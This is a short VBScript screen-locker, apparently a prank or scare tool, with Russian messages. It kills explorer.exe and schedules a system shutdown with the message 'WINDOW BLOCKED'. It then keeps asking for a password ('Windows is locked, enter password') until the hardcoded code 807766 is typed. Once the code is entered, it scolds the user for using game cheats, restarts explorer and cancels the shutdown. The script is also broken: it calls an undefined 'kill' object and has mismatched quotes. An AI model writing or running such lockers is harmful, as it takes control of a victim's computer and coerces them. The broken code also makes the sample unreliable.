Do
set t=createobject("Wscript.Shell")
kill.run"taskkill /f /im explorer.exe"
t.run"shutdown -t 3600 -s -c WINDOW BLOCKED"
password =InputBox ('Windows заблокирован, введите пароль")
Loop Until password = "807766"
msgbox "windows разблокирован" ,16, "надеюсь ты больше не будешь играть с читами"
t.run"explorer"
t.run"shutdown -a"